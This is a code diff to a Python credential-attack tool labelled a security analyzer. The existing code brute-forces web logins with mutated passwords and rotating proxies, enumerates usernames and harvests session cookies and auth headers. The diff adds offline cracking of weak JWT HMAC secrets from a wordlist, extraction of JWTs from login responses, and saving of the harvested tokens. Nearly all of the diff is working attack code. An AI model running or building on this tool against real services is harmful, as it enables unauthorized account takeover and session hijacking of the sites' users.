@@ -9,6 +9,9 @@ import threading
 import itertools
 import time
 import random
+import base64
+import hmac
+import hashlib
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
 from collections import Counter, defaultdict
@@ -71,17 +74,14 @@ def mutate_passwords(passwords):
     suffixes = ["2025", "2026", "2027", "123", "1234", "!", "@", "#", "!@#"]
     
     for pwd in passwords:
-        # 1. Capitalization variations
         mutated.add(pwd.capitalize())
         mutated.add(pwd.upper())
         mutated.add(pwd.lower())
         
-        # 2. Append year / symbol suffixes
         for s in suffixes:
             mutated.add(f"{pwd}{s}")
             mutated.add(f"{pwd.capitalize()}{s}")
             
-        # 3. Leetspeak substitutions
         leet = pwd.replace('e', '3').replace('a', '@').replace('s', '$').replace('o', '0')
         mutated.add(leet)
         mutated.add(leet.capitalize())
@@ -162,6 +162,81 @@ def extract_csrf_token(html_content, csrf_field_name):
             token = generic_match.group(1)
             
     return token
+
+def base64_url_decode(inp):
+    """Decodes base64url encoded strings safely with proper padding."""
+    rem = len(inp) % 4
+    if rem > 0:
+        inp += '=' * (4 - rem)
+    return base64.urlsafe_b64decode(inp.encode('utf-8'))
+
+def audit_jwt_token(token, secret_file):
+    """Decodes a JWT, analyzes claims and algorithm security, and attempts offline weak secret cracking."""
+    print("\n" + "="*60 + "\n[*] Starting Automated JWT Security Audit:")
+    parts = token.split('.')
+    if len(parts) != 3:
+        print("    [-] Provided token is not a valid 3-part JWT structure.")
+        print("="*60)
+        return None
+
+    try:
+        header_json = json.loads(base64_url_decode(parts[0]).decode('utf-8'))
+        payload_json = json.loads(base64_url_decode(parts[1]).decode('utf-8'))
+    except Exception as e:
+        print(f"    [-] Failed to decode JWT header/payload: {e}")
+        print("="*60)
+        return None
+
+    print(f"    - Algorithm (alg): {header_json.get('alg', 'UNKNOWN')}")
+    print(f"    - Token Type (typ): {header_json.get('typ', 'N/A')}")
+    print(f"    - Decoded Payload Claims: {json.dumps(payload_json, indent=8)}")
+
+    vulnerabilities = []
+    alg = header_json.get('alg', '').lower()
+
+    if alg == 'none':
+        print("\n    [!] [CRITICAL VULNERABILITY] JWT uses 'none' algorithm (Signature Bypass possible)!")
+        vulnerabilities.append("Insecure 'none' algorithm")
+    elif alg.startswith('hs'):
+        print(f"\n    [*] JWT uses HMAC signature ({alg.upper()}). Attempting offline secret brute-force...")
+        secrets = load_wordlist(secret_file)
+        if not secrets:
+            secrets = ["secret", "password", "123456", "admin", "supersecret", "key", "jwt_secret", "secretkey"]
+            print(f"    - No secret file found at '{secret_file}'. Using default weak secret wordlist ({len(secrets)} items).")
+        else:
+            print(f"    - Loaded {len(secrets)} candidate secret(s) from {secret_file}.")
+
+        message = f"{parts[0]}.{parts[1]}".encode('utf-8')
+        target_sig_b64 = parts[2]
+        cracked_secret = None
+
+        for sec in secrets:
+            hasher = hmac.new(sec.encode('utf-8'), message, hashlib.sha256 if alg == 'hs256' else hashlib.sha512)
+            computed_sig = base64.urlsafe_b64encode(hasher.digest()).decode('utf-8').rstrip('=')
+            if hmac.compare_digest(computed_sig, target_sig_b64):
+                cracked_secret = sec
+                break
+
+        if cracked_secret:
+            print(f"    [+] [CRITICAL VULNERABILITY] Weak JWT Secret Cracked Successfully -> '{cracked_secret}'")
+            vulnerabilities.append(f"Weak HS256 secret cracked: '{cracked_secret}'")
+        else:
+            print("    [-] No matching secret found in wordlist.")
+
+    exp = payload_json.get('exp')
+    if exp:
+        exp_dt = datetime.fromtimestamp(exp)
+        is_expired = datetime.now() > exp_dt
+        print(f"    - Expiration (exp): {exp_dt} ({'Expired' if is_expired else 'Active'})")
+        if not is_expired and exp - time.time() > 86400 * 30:
+            print("    [!] [WARNING] Token has an exceptionally long lifespan.")
+
+    print("="*60)
+    return {
+        "header": header_json,
+        "payload": payload_json,
+        "vulnerabilities": vulnerabilities
+    }
 
 def test_user_existence(session, target_url, username, auth_type, content_type, user_field, pass_field, proxy_pool, single_proxy, base_headers, cookies, extract_csrf, csrf_field, probe_password, delay, verbose):
     """Probes a single username with a dummy password to check for account existence via differential response analysis."""
@@ -342,6 +417,9 @@ def test_auth(session, target_url, username, password, auth_type, content_type, 
 
         captured_cookies = {c.name: c.value for c in resp.cookies} if resp else {}
         captured_headers = {k: v for k, v in resp.headers.items() if 'auth' in k.lower() or 'token' in k.lower() or 'set-cookie' in k.lower()} if resp else {}
+        
+        # Also check response body for any JWT strings if present
+        jwt_candidates = re.findall(r'ey[A-Za-z0-9_-]+\.ey[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', resp.text) if resp else []
 
         result = {
             "username": username,
@@ -353,7 +431,8 @@ def test_auth(session, target_url, username, password, auth_type, content_type, 
             "response_length": resp_length,
             "success": is_success,
             "session_cookies": captured_cookies,
-            "session_headers": captured_headers
+            "session_headers": captured_headers,
+            "jwt_candidates": jwt_candidates
         }
 
         if is_success:
@@ -361,7 +440,9 @@ def test_auth(session, target_url, username, password, auth_type, content_type, 
             if captured_cookies:
                 print(f"    [+] Harvested Cookies: {captured_cookies}")
             if captured_headers:
-                print(f"    [+] Harvested Auth Headers: {captured_headers}\n")
+                print(f"    [+] Harvested Auth Headers: {captured_headers}")
+            if jwt_candidates:
+                print(f"    [+] Discovered JWT Tokens in Response: {len(jwt_candidates)} token(s)\n")
         elif verbose:
             print(f"[-] Failed {auth_type} login {username}:{password} at {target_url} (Status: {status_code}, Length: {resp_length}B)")
 
@@ -727,11 +808,29 @@ def run_analysis(args):
                         "type": res['type'],
                         "status_code": res['status_code'],
                         "session_cookies": res['session_cookies'],
-                        "session_headers": res['session_headers']
+                        "session_headers": res['session_headers'],
+                        "jwt_candidates": res.get('jwt_candidates', [])
                     })
 
     if circuit_breaker.is_tripped():
         print("\n[!] Scan aborted early due to Circuit Breaker trip (Account Lockout Safeguard activated).")
+
+    # Automated JWT auditing on harvested tokens if enabled
+    if args.jwt_audit:
+        audited_tokens = set()
+        for item in valid_credentials:
+            for t in item.get('jwt_candidates', []):
+                audited_tokens.add(t)
+        # Also check if an explicit token was passed or check sessions.json
+        if args.jwt_token:
+            audited_tokens.add(args.jwt_token)
+
+        if audited_tokens:
+            for jwt_str in audited_tokens:
+                audit_jwt_token(jwt_str, args.jwt_secrets)
+        else:
+            print("\n" + "="*60 + "\n[*] Automated JWT Audit: No JWT tokens were captured in responses or specified.")
+            print("="*60)
 
     timing_vulns = []
     if args.timing_analysis:
@@ -744,7 +843,7 @@ def run_analysis(args):
     return valid_credentials, timing_vulns, length_outliers
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Advanced Security Analyzer with Smart Password Mutation")
+    parser = argparse.ArgumentParser(description="Advanced Security Analyzer with Automated JWT Auditing")
     parser.add_argument("-u", "--url", required=True, help="Target URL")
     parser.add_argument("--auth-type", choices=["form", "basic", "digest"], default="form", help="Authentication type to test")
     parser.add_argument("--content-type", choices=["form", "json"], default="form", help="Payload content type for form/API auth")
@@ -753,6 +852,9 @@ if __name__ == "__main__":
     parser.add_argument("--enum-users", action="store_true", help="Enable dedicated account enumeration mode")
     parser.add_argument("--probe-password", default="invalidprobe12345!", help="Dummy password used during user enumeration probe")
     parser.add_argument("--mutate", action="store_true", help="Enable smart password mutation & rule engine")
+    parser.add_argument("--jwt-audit", action="store_true", help="Enable automated JWT security audit and secret cracking")
+    parser.add_argument("--jwt-token", help="Explicit JWT token string to audit")
+    parser.add_argument("--jwt-secrets", default="passwords.txt", help="Wordlist for JWT HMAC secret cracking")
     parser.add_argument("--users", default="usernames.txt", help="Path to usernames wordlist")
     parser.add_argument("--passwords", default="passwords.txt", help="Path to passwords wordlist")
     parser.add_argument("--user-field", default="username", help="Payload field name for username")
@@ -793,7 +895,7 @@ if __name__ == "__main__":
 
         if args.save_session:
             with open(args.save_session, 'w', encoding='utf-8') as f:
-                json.dump([{ "username": item["username"], "cookies": item["session_cookies"], "headers": item["session_headers"] } for item in found], f, indent=4)
+                json.dump([{ "username": item["username"], "cookies": item["session_cookies"], "headers": item["session_headers"], "jwt_candidates": item.get("jwt_candidates", []) } for item in found], f, indent=4)
             print(f"[*] Harvested session state successfully saved to: {args.save_session}")
 
     if args.report:
